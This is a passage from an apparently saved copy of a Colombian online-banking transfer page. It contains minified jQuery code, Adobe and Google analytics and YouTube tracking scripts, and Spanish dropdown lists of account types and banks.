charset=UTF-8",accepts:{"*":It,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":S.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?$t($t(e,S.ajaxSettings),t):$t(S.ajaxSettings,e)},ajaxPrefilter:Ft(Rt),ajaxTransport:Ft(Mt),ajax:function(e,t){"object"==typeof e&&(t=e,e=void 0),t=t||{};var c,f,p,n,d,r,h,g,i,o,v=S.ajaxSetup({},t),y=v.context||v,m=v.context&&(y.nodeType||y.jquery)?S(y):S.event,x=S.Deferred(),b=S.Callbacks("once memory"),w=v.statusCode||{},a={},s={},u="canceled",T={readyState:0,getResponseHeader:function(e){var t;if(h){if(!n){n={};while(t=Ht.exec(p))n[t[1].toLowerCase()+" "]=(n[t[1].toLowerCase()+" "]||[]).concat(t[2])}t=n[e.toLowerCase()+" "]}return null==t?null:t.join(", ")},getAllResponseHeaders:function(){return h?p:null},setRequestHeader:function(e,t){return null==h&&(e=s[e.toLowerCase()]=s[e.toLowerCase()]||e,a[e]=t),this},overrideMimeType:function(e){return null==h&&(v.mimeType=e),this},statusCode:function(e){var t;if(e)if(h)T.always(e[T.status]);else for(t in e)w[t]=[w[t],e[t]];return this},abort:function(e){var t=e||u;return c&&c.abort(t),l(0,t),this}};if(x.promise(T),v.url=((e||v.url||Tt.href)+"").replace(Pt,Tt.protocol+"//"),v.type=t.method||t.type||v.method||v.type,v.dataTypes=(v.dataType||"*").toLowerCase().match(P)||[""],null==v.crossDomain){r=E.createElement("a");try{r.href=v.url,r.href=r.href,v.crossDomain=Wt.protocol+"//"+Wt.host!=r.protocol+"//"+r.host}catch(e){v.crossDomain=!0}}if(v.data&&v.processData&&"string"!=typeof v.data&&(v.data=S.param(v.data,v.traditional)),Bt(Rt,v,t,T),h)return T;for(i in(g=S.event&&v.global)&&0==S.active++&&S.event.trigger("ajaxStart"),v.type=v.type.toUpperCase(),v.hasContent=!Ot.test(v.type),f=v.url.replace(qt,""),v.hasContent?v.data&&v.processData&&0===(v.contentType||"").indexOf("application/x-www-form-urlencoded")&&(v.data=v.data.replace(jt,"+")):(o=v.url.slice(f.length),v.data&&(v.processData||"string"==typeof v.data)&&(f+=(Et.test(f)?"&":"?")+v.data,delete v.data),!1===v.cache&&(f=f.replace(Lt,"$1"),o=(Et.test(f)?"&":"?")+"_="+Ct.guid+++o),v.url=f+o),v.ifModified&&(S.lastModified[f]&&T.setRequestHeader("If-Modified-Since",S.lastModified[f]),S.etag[f]&&T.setRequestHeader("If-None-Match",S.etag[f])),(v.data&&v.hasContent&&!1!==v.contentType||t.contentType)&&T.setRequestHeader("Content-Type",v.contentType),T.setRequestHeader("Accept",v.dataTypes[0]&&v.accepts[v.dataTypes[0]]?v.accepts[v.dataTypes[0]]+("*"!==v.dataTypes[0]?", "+It+"; q=0.01":""):v.accepts["*"]),v.headers)T.setRequestHeader(i,v.headers[i]);if(v.beforeSend&&(!1===v.beforeSend.call(y,T,v)||h))return T.abort();if(u="abort",b.add(v.complete),T.done(v.success),T.fail(v.error),c=Bt(Mt,v,t,T)){if(T.readyState=1,g&&m.trigger("ajaxSend",[T,v]),h)return T;v.async&&0<v.timeout&&(d=C.setTimeout(function(){T.abort("timeout")},v.timeout));try{h=!1,c.send(a,l)}catch(e){if(h)throw e;l(-1,e)}}else l(-1,"No Transport");function l(e,t,n,r){var i,o,a,s,u,l=t;h||(h=!0,d&&C.clearTimeout(d),c=void 0,p=r||"",T.readyState=0<e?4:0,i=200<=e&&e<300||304===e,n&&(s=function(e,t,n){var r,i,o,a,s=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in s)if(s[i]&&s[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}a||(a=i)}o=o||a}if(o)return o!==u[0]&&u.unshift(o),n[o]}(v,T,n)),!i&&-1<S.inArray("script",v.dataTypes)&&(v.converters["text script"]=function(){}),s=function(e,t,n,r){var i,o,a,s,u,l={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)l[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(!(a=l[u+" "+o]||l["* "+o]))for(i in l)if((s=i.split(" "))[1]===o&&(a=l[u+" "+s[0]]||l["* "+s[0]])){!0===a?a=l[i]:!0!==l[i]&&(o=s[0],c.unshift(s[1]));break}if(!0!==a)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}(v,s,T,i),i?(v.ifModified&&((u=T.getResponseHeader("Last-Modified"))&&(S.lastModified[f]=u),(u=T.getResponseHeader("etag"))&&(S.etag[f]=u)),204===e||"HEAD"===v.type?l="nocontent":304===e?l="notmodified":(l=s.state,o=s.data,i=!(a=s.error))):(a=l,!e&&l||(l="error",e<0&&(e=0))),T.status=e,T.statusText=(t||l)+"",i?x.resolveWith(y,[o,l,T]):x.rejectWith(y,[T,l,a]),T.statusCode(w),w=void 0,g&&m.trigger(i?"ajaxSuccess":"ajaxError",[T,v,i?o:a]),b.fireWith(y,[T,l]),g&&(m.trigger("ajaxComplete",[T,v]),--S.active||S.event.trigger("ajaxStop")))}return T},getJSON:function(e,t,n){return S.get(e,t,n,"json")},getScript:function(e,t){return S.get(e,void 0,t,"script")}}),S.each(["get","post"],function(e,i){S[i]=function(e,t,n,r){return m(t)&&(r=r||n,n=t,t=void 0),S.ajax(S.extend({url:e,type:i,dataType:r,data:t,success:n},S.isPlainObject(e)&&e))}}),S.ajaxPrefilter(function(e){var t;for(t in e.headers)"content-type"===t.toLowerCase()&&(e.contentType=e.headers[t]||"")}),S._evalUrl=function(e,t,n){return S.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,converters:{"text script":function(){}},dataFilter:function(e){S.globalEval(e,t,n)}})},S.fn.extend({wrapAll:function(e){var t;return this[0]&&(m(e)&&(e=e.call(this[0])),t=S(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(n){return m(n)?this.each(function(e){S(this).wrapInner(n.call(this,e))}):this.each(function(){var e=S(this),t=e.contents();t.length?t.wrapAll(n):e.append(n)})},wrap:function(t){var n=m(t);return this.each(function(e){S(this).wrapAll(n?t.call(this,e):t)})},unwrap:function(e){return this.parent(e).not("body").each(function(){S(this).replaceWith(this.childNodes)}),this}}),S.expr.pseudos.hidden=function(e){return!S.expr.pseudos.visible(e)},S.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},S.ajaxSettings.xhr=function(){try{return new C.XMLHttpRequest}catch(e){}};var _t={0:200,1223:204},zt=S.ajaxSettings.xhr();y.cors=!!zt&&"withCredentials"in zt,y.ajax=zt=!!zt,S.ajaxTransport(function(i){var o,a;if(y.cors||zt&&!i.crossDomain)return{send:function(e,t){var n,r=i.xhr();if(r.open(i.type,i.url,i.async,i.username,i.password),i.xhrFields)for(n in i.xhrFields)r[n]=i.xhrFields[n];for(n in i.mimeType&&r.overrideMimeType&&r.overrideMimeType(i.mimeType),i.crossDomain||e["X-Requested-With"]||(e["X-Requested-With"]="XMLHttpRequest"),e)r.setRequestHeader(n,e[n]);o=function(e){return function(){o&&(o=a=r.onload=r.onerror=r.onabort=r.ontimeout=r.onreadystatechange=null,"abort"===e?r.abort():"error"===e?"number"!=typeof r.status?t(0,"error"):t(r.status,r.statusText):t(_t[r.status]||r.status,r.statusText,"text"!==(r.responseType||"text")||"string"!=typeof r.responseText?{binary:r.response}:{text:r.responseText},r.getAllResponseHeaders()))}},r.onload=o(),a=r.onerror=r.ontimeout=o("error"),void 0!==r.onabort?r.onabort=a:r.onreadystatechange=function(){4===r.readyState&&C.setTimeout(function(){o&&a()})},o=o("abort");try{r.send(i.hasContent&&i.data||null)}catch(e){if(o)throw e}},abort:function(){o&&o()}}}),S.ajaxPrefilter(function(e){e.crossDomain&&(e.contents.script=!1)}),S.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(e){return S.globalEval(e),e}}}),S.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),S.ajaxTransport("script",function(n){var r,i;if(n.crossDomain||n.scriptAttrs)return{send:function(e,t){r=S("<script>").attr(n.scriptAttrs||{}).prop({charset:n.scriptCharset,src:n.url}).on("load error",i=function(e){r.remove(),i=null,e&&t("error"===e.type?404:200,e.type)}),E.head.appendChild(r[0])},abort:function(){i&&i()}}});var Ut,Xt=[],Vt=/(=)\?(?=&|$)|\?\?/;S.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=Xt.pop()||S.expando+"_"+Ct.guid++;return this[e]=!0,e}}),S.ajaxPrefilter("json jsonp",function(e,t,n){var r,i,o,a=!1!==e.jsonp&&(Vt.test(e.url)?"url":"string"==typeof e.data&&0===(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&Vt.test(e.data)&&"data");if(a||"jsonp"===e.dataTypes[0])return r=e.jsonpCallback=m(e.jsonpCallback)?e.jsonpCallback():e.jsonpCallback,a?e[a]=e[a].replace(Vt,"$1"+r):!1!==e.jsonp&&(e.url+=(Et.test(e.url)?"&":"?")+e.jsonp+"="+r),e.converters["script json"]=function(){return o||S.error(r+" was not called"),o[0]},e.dataTypes[0]="json",i=C[r],C[r]=function(){o=arguments},n.always(function(){void 0===i?S(C).removeProp(r):C[r]=i,e[r]&&(e.jsonpCallback=t.jsonpCallback,Xt.push(r)),o&&m(i)&&i(o[0]),o=i=void 0}),"script"}),y.createHTMLDocument=((Ut=E.implementation.createHTMLDocument("").body).innerHTML="<form></form><form></form>",2===Ut.childNodes.length),S.parseHTML=function(e,t,n){return"string"!=typeof e?[]:("boolean"==typeof t&&(n=t,t=!1),t||(y.createHTMLDocument?((r=(t=E.implementation.createHTMLDocument("")).createElement("base")).href=E.location.href,t.head.appendChild(r)):t=E),o=!n&&[],(i=N.exec(e))?[t.createElement(i[1])]:(i=xe([e],t,o),o&&o.length&&S(o).remove(),S.merge([],i.childNodes)));var r,i,o},S.fn.load=function(e,t,n){var r,i,o,a=this,s=e.indexOf(" ");return-1<s&&(r=vt(e.slice(s)),e=e.slice(0,s)),m(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),0<a.length&&S.ajax({url:e,type:i||"GET",dataType:"html",data:t}).done(function(e){o=arguments,a.html(r?S("<div>").append(S.parseHTML(e)).find(r):e)}).always(n&&function(e,t){a.each(function(){n.apply(this,o||[e.responseText,t,e])})}),this},S.expr.pseudos.animated=function(t){return S.grep(S.timers,function(e){return t===e.elem}).length},S.offset={setOffset:function(e,t,n){var r,i,o,a,s,u,l=S.css(e,"position"),c=S(e),f={};"static"===l&&(e.style.position="relative"),s=c.offset(),o=S.css(e,"top"),u=S.css(e,"left"),("absolute"===l||"fixed"===l)&&-1<(o+u).indexOf("auto")?(a=(r=c.position()).top,i=r.left):(a=parseFloat(o)||0,i=parseFloat(u)||0),m(t)&&(t=t.call(e,n,S.extend({},s))),null!=t.top&&(f.top=t.top-s.top+a),null!=t.left&&(f.left=t.left-s.left+i),"using"in t?t.using.call(e,f):("number"==typeof f.top&&(f.top+="px"),"number"==typeof f.left&&(f.left+="px"),c.css(f))}},S.fn.extend({offset:function(t){if(arguments.length)return void 0===t?this:this.each(function(e){S.offset.setOffset(this,t,e)});var e,n,r=this[0];return r?r.getClientRects().length?(e=r.getBoundingClientRect(),n=r.ownerDocument.defaultView,{top:e.top+n.pageYOffset,left:e.left+n.pageXOffset}):{top:0,left:0}:void 0},position:function(){if(this[0]){var e,t,n,r=this[0],i={top:0,left:0};if("fixed"===S.css(r,"position"))t=r.getBoundingClientRect();else{t=this.offset(),n=r.ownerDocument,e=r.offsetParent||n.documentElement;while(e&&(e===n.body||e===n.documentElement)&&"static"===S.css(e,"position"))e=e.parentNode;e&&e!==r&&1===e.nodeType&&((i=S(e).offset()).top+=S.css(e,"borderTopWidth",!0),i.left+=S.css(e,"borderLeftWidth",!0))}return{top:t.top-i.top-S.css(r,"marginTop",!0),left:t.left-i.left-S.css(r,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var e=this.offsetParent;while(e&&"static"===S.css(e,"position"))e=e.offsetParent;return e||re})}}),S.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(t,i){var o="pageYOffset"===i;S.fn[t]=function(e){return $(this,function(e,t,n){var r;if(x(e)?r=e:9===e.nodeType&&(r=e.defaultView),void 0===n)return r?r[i]:e[t];r?r.scrollTo(o?r.pageXOffset:n,o?n:r.pageYOffset):e[t]=n},t,e,arguments.length)}}),S.each(["top","left"],function(e,n){S.cssHooks[n]=$e(y.pixelPosition,function(e,t){if(t)return t=Be(e,n),Me.test(t)?S(e).position()[n]+"px":t})}),S.each({Height:"height",Width:"width"},function(a,s){S.each({padding:"inner"+a,content:s,"":"outer"+a},function(r,o){S.fn[o]=function(e,t){var n=arguments.length&&(r||"boolean"!=typeof e),i=r||(!0===e||!0===t?"margin":"border");return $(this,function(e,t,n){var r;return x(e)?0===o.indexOf("outer")?e["inner"+a]:e.document.documentElement["client"+a]:9===e.nodeType?(r=e.documentElement,Math.max(e.body["scroll"+a],r["scroll"+a],e.body["offset"+a],r["offset"+a],r["client"+a])):void 0===n?S.css(e,t,i):S.style(e,t,n,i)},s,n?e:void 0,n)}})}),S.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){S.fn[t]=function(e){return this.on(t,e)}}),S.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)},hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),S.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "),function(e,n){S.fn[n]=function(e,t){return 0<arguments.length?this.on(n,null,e,t):this.trigger(n)}});var Gt=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;S.proxy=function(e,t){var n,r,i;if("string"==typeof t&&(n=e[t],t=e,e=n),m(e))return r=s.call(arguments,2),(i=function(){return e.apply(t||this,r.concat(s.call(arguments)))}).guid=e.guid=e.guid||S.guid++,i},S.holdReady=function(e){e?S.readyWait++:S.ready(!0)},S.isArray=Array.isArray,S.parseJSON=JSON.parse,S.nodeName=A,S.isFunction=m,S.isWindow=x,S.camelCase=X,S.type=w,S.now=Date.now,S.isNumeric=function(e){var t=S.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},S.trim=function(e){return null==e?"":(e+"").replace(Gt,"")},"function"==typeof define&&define.amd&&define("jquery",[],function(){return S});var Yt=C.jQuery,Qt=C.$;return S.noConflict=function(e){return C.$===S&&(C.$=Qt),e&&C.jQuery===S&&(C.jQuery=Yt),S},"undefined"==typeof e&&(C.jQuery=C.$=S),S});
}
});</script><script>_satellite["_runScript2"](function(event, target, Promise) {
var ghead = document.getElementsByTagName("head")[0];
var gscript = document.createElement("script");
gscript.src = "https://www.googletagmanager.com/gtag/js?id=DC-10352449";
ghead.appendChild(gscript);

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'DC-10352449');
});</script><script>_satellite["_runScript3"](function(event, target, Promise) {
window.validate = function(trackObject) {
var error = false
  try{
      if(typeof(digitalData) == "undefined"){
        error = true
        _satellite.logger.info('digitalData no está definido en ' + trackObject.action)
      }
      var digitalDataInPage = Object.getOwnPropertyNames(digitalData)
      var digitalDataPlantilla =  Object.getOwnPropertyNames(_satellite.getVar('CC.digitalDataTemplate'))
      var errorEstructura = false
      for(i=0;i<digitalDataInPage.length;i++){
        if(digitalDataInPage[i] != digitalDataPlantilla[i]){
          errorEstructura = true
          error = true
         }
      }
      if(errorEstructura)
        _satellite.logger.info('digitalData tiene la estructura incorrecta en ' + trackObject.action)
      
      if(JSON.stringify(digitalData) != JSON.stringify(trackObject.digitalData)){
        error = true
        _satellite.logger.info('digitalData ha cambiado en tiempo de ejecución en' + trackObject.action)
      }
      _satellite.logger.info('digitalData enviado en ' + trackObject.action + ' es : ')
      _satellite.logger.info(trackObject.digitalData)
      if(!error)
        _satellite.logger.info('digitalData correcto en '+ trackObject.action)
  }catch(e){ 
  }
}

});</script><script>
/*
  activityId: tokens[i]['activity.id'], "331094"
  activityName: tokens[i]['activity.name'], "Prueba_AEM_anti_parpadeo"
  experienceId: tokens[i]['experience.id'], "1"
  experienceName: tokens[i]['experience.name'], "Experience B"
  experienceId: tokens[i]['experience.id'], "1"
  
  ----------------------
  
  idOptimization: "331094",
  experience: "Prueba_AEM_anti_parpadeo|Experience B", 
  place: "",
  type: "",
  executor: "target",
  audience: "",
  
  ------------------------
*/

if (window.adobe && adobe.target) {
		document.addEventListener(adobe.target.event.REQUEST_SUCCEEDED, function(e) {
			if (e.detail.responseTokens) {
				var tokens = e.detail.responseTokens;
				window.targetExperiences = [];
				for (var i=0; i<tokens.length; i++) {
					var inList = false;
					for (var j=0; j<targetExperiences.length; j++){
						if (targetExperiences[j].idOptimization == tokens[i]['activity.id']) {
							inList = true;
							break;
						}
					}
					
					if (!inList) {
						targetExperiences.push({
							idOptimization: tokens[i]['activity.id'],
							experience: tokens[i]['activity.name'] + "|" + tokens[i]['experience.name'],
                            place: "",
                            type: "",
                            executor: "target",
                            audience: ""                          
						});
					}
				}
			}
			
			if (window.targetLoaded) {
				// TODO: respond with an event tracking call
			} else {
				// TODO: respond with a page tracking call
			} 
		});
	}
	
	// set failsafe in case Target doesn't load
	setTimeout(function() {
		if (!window.targetLoaded) {
			// TODO: respond with a page tracking call
		}
	}, 5000);
</script><script>
// Load de API & insert
//
var tag = document.createElement('script');
tag.src = "https://www.youtube.com/iframe_api";
var firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);	

// Activate API YouTube
//
for (var e = document.getElementsByTagName("iframe"), x = e.length; x--;)
	if (/youtube.com\/embed/.test(e[x].src))
		if(e[x].src.indexOf('enablejsapi=') === -1)
			e[x].src += (e[x].src.indexOf('?') ===-1 ? '?':'&') + 'enablejsapi=1';


var YTPlayers = []; // Support multiple players on the same page

// Attach our YT listener once the API is loaded
//
function onYouTubeIframeAPIReady() {
    for (var e = document.getElementsByTagName("iframe"), x = e.length; x--;) {
        if (/youtube.com\/embed/.test(e[x].src)) {
            YTPlayers.push(new YT.Player(e[x], {
                events: {
                    onReady: onPlayerReady,
                    onStateChange: onPlayerStateChange,
                    onError: onPlayerError
                }
            }));
        }
    }
}


// Listen for play/pause, other states such as rewind and end could also be added, also report % played every second
// 
function onPlayerStateChange(event) { 
  
  window.digitalData.page.pageActivity.video.player = "youtube" 
  
  if(event.data == YT.PlayerState.PLAYING && Math.floor(event.target.getCurrentTime()) == 0){        
    window.digitalData.page.pageActivity.video.nameOfVideoDisplayed = event.target.getVideoData().title;
    window.digitalData.page.pageActivity.video.duration = Math.floor(event.target.getDuration());
    window.digitalData.page.pageActivity.video.id = event.target.getVideoData().video_id;  
    window.digitalData.page.pageActivity.video.url = event.target.getVideoUrl()
    window.digitalData.page.pageActivity.video.quality = event.target.getPlaybackQuality()  
    _satellite.logger.info("**** Video Player Start **** video.nameOfVideoDisplayed: " + window.digitalData.page.pageActivity.video.nameOfVideoDisplayed + "| video.id: " + window.digitalData.page.pageActivity.video.id + "| video.duration: " + window.digitalData.page.pageActivity.video.duration+ "| video.url: " + window.digitalData.page.pageActivity.video.url+ "| video.quality: " + window.digitalData.page.pageActivity.video.quality)
    digitalLink("Video Player Start", digitalData)
  }   
  
  if (event.data == YT.PlayerState.ENDED){
    window.digitalData.page.pageActivity.video.nameOfVideoDisplayed = event.target.getVideoData().title;
    window.digitalData.page.pageActivity.video.duration = Math.floor(event.target.getDuration());
    window.digitalData.page.pageActivity.video.id = event.target.getVideoData().video_id;  
    window.digitalData.page.pageActivity.video.url = event.target.getVideoUrl()
    window.digitalData.page.pageActivity.video.quality = event.target.getPlaybackQuality()
    _satellite.logger.info("**** Video Player End **** video.nameOfVideoDisplayed: " + window.digitalData.page.pageActivity.video.nameOfVideoDisplayed + "| video.id: " + window.digitalData.page.pageActivity.video.id + "| video.duration: " + window.digitalData.page.pageActivity.video.duration+ "| video.url: " + window.digitalData.page.pageActivity.video.url+ "| video.quality: " + window.digitalData.page.pageActivity.video.quality)
    digitalLink("Video Player End", digitalData)
  }		
}
  
function onPlayerError(event) {
    _satellite.logger.info("**** Video Player Error ****", event);
}

function onPlayerReady(event) {
    _satellite.logger.info("**** Video Player Ready ****", event);
}

</script>
<script type="text/javascript" src="./plantilla_files/8LPAYOK2wB"></script>
<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div><div class="ui-dialog-docking-zone"></div><div id="conoritaThemeform:selectOwnAccount_panel" class="ui-selectonemenu-panel ui-widget ui-widget-content ui-corner-all ui-helper-hidden ui-shadow ui-input-overlay select-panel__coronitaV2"><div class="ui-selectonemenu-items-wrapper" style="max-height:200px"><ul id="conoritaThemeform:selectOwnAccount_items" class="ui-selectonemenu-items ui-selectonemenu-list ui-widget-content ui-widget ui-corner-all ui-helper-reset" role="listbox" aria-activedescendant="conoritaThemeform:selectOwnAccount_0"><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all ui-state-highlight" data-label="&amp;nbsp;" tabindex="-1" role="option" id="conoritaThemeform:selectOwnAccount_0">&nbsp;</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Cuenta de Ahorro" tabindex="-1" role="option" id="conoritaThemeform:selectOwnAccount_1">Cuenta de Ahorro</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Cuenta Corriente" tabindex="-1" role="option" id="conoritaThemeform:selectOwnAccount_2">Cuenta Corriente</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Dinero Móvil" tabindex="-1" role="option" id="conoritaThemeform:selectOwnAccount_3">Dinero Móvil</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="Depósito Electrónico" tabindex="-1" role="option" id="conoritaThemeform:selectOwnAccount_4">Depósito Electrónico</li></ul></div></div><div id="conoritaThemeform:selectBank_panel" class="ui-selectonemenu-panel ui-widget ui-widget-content ui-corner-all ui-helper-hidden ui-shadow ui-input-overlay select-panel__coronitaV2"><div class="ui-selectonemenu-items-wrapper" style="max-height:200px"><ul id="conoritaThemeform:selectBank_items" class="ui-selectonemenu-items ui-selectonemenu-list ui-widget-content ui-widget ui-corner-all ui-helper-reset" role="listbox" aria-activedescendant="conoritaThemeform:selectBank_0"><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all ui-state-highlight" data-label="&amp;nbsp;" tabindex="-1" role="option" id="conoritaThemeform:selectBank_0">&nbsp;</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO BBVA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_1">BANCO BBVA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCAMIA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_2">BANCAMIA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO AGRARIO" tabindex="-1" role="option" id="conoritaThemeform:selectBank_3">BANCO AGRARIO</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO AV VILLAS" tabindex="-1" role="option" id="conoritaThemeform:selectBank_4">BANCO AV VILLAS</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO BTG PACTUAL" tabindex="-1" role="option" id="conoritaThemeform:selectBank_5">BANCO BTG PACTUAL</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO CAJA SOCIAL" tabindex="-1" role="option" id="conoritaThemeform:selectBank_6">BANCO CAJA SOCIAL</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO CITIBANK" tabindex="-1" role="option" id="conoritaThemeform:selectBank_7">BANCO CITIBANK</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO COOPERATIVO COOPCENTRAL" tabindex="-1" role="option" id="conoritaThemeform:selectBank_8">BANCO COOPERATIVO COOPCENTRAL</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO CREDIFINANCIERA SA." tabindex="-1" role="option" id="conoritaThemeform:selectBank_9">BANCO CREDIFINANCIERA SA.</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO DAVIVIENDA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_10">BANCO DAVIVIENDA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO DE BOGOTÁ" tabindex="-1" role="option" id="conoritaThemeform:selectBank_11">BANCO DE BOGOTÁ</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO DE OCCIDENTE" tabindex="-1" role="option" id="conoritaThemeform:selectBank_12">BANCO DE OCCIDENTE</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO FALABELLA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_13">BANCO FALABELLA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO FINANDINA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_14">BANCO FINANDINA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO GNB SUDAMERIS" tabindex="-1" role="option" id="conoritaThemeform:selectBank_15">BANCO GNB SUDAMERIS</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO ITAÚ" tabindex="-1" role="option" id="conoritaThemeform:selectBank_16">BANCO ITAÚ</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO ITAÚ*" tabindex="-1" role="option" id="conoritaThemeform:selectBank_17">BANCO ITAÚ*</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO J.P. MORGAN COLOMBIA S.A" tabindex="-1" role="option" id="conoritaThemeform:selectBank_18">BANCO J.P. MORGAN COLOMBIA S.A</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO MUNDO MUJER S.A." tabindex="-1" role="option" id="conoritaThemeform:selectBank_19">BANCO MUNDO MUJER S.A.</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO PICHINCHA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_20">BANCO PICHINCHA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO POPULAR" tabindex="-1" role="option" id="conoritaThemeform:selectBank_21">BANCO POPULAR</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO PROCREDIT" tabindex="-1" role="option" id="conoritaThemeform:selectBank_22">BANCO PROCREDIT</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO SANTANDER" tabindex="-1" role="option" id="conoritaThemeform:selectBank_23">BANCO SANTANDER</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO SERFINANZA S.A." tabindex="-1" role="option" id="conoritaThemeform:selectBank_24">BANCO SERFINANZA S.A.</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO TEQUENDAMA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_25">BANCO TEQUENDAMA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO UALA BANCAR TECNOLOGIA CO S.A" tabindex="-1" role="option" id="conoritaThemeform:selectBank_26">BANCO UALA BANCAR TECNOLOGIA CO S.A</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCO WWB" tabindex="-1" role="option" id="conoritaThemeform:selectBank_27">BANCO WWB</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCOLDEX" tabindex="-1" role="option" id="conoritaThemeform:selectBank_28">BANCOLDEX</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCOLOMBIA" tabindex="-1" role="option" id="conoritaThemeform:selectBank_29">BANCOLOMBIA</li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" data-label="BANCOMPARTIR " tabindex="-1" role="option" id="conoritaThemeform:selectBank_30">BANCOMPARTIR </li><li class="ui-selectonemenu-item ui-selectonemenu-list-item ui-corner-all" 